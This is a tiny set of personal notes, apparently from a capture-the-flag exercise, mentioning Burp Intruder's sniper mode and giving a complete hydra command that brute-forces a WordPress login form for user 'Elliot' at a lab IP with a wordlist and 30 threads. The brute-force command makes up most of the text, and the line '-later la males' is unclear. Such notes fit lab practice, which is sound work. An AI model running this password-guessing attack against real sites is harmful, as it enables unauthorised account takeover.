#intruder sniper
-later la males

#hydra
hydra -l Elliot -P wordl.txt 10.10.203.64 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username' -t 30 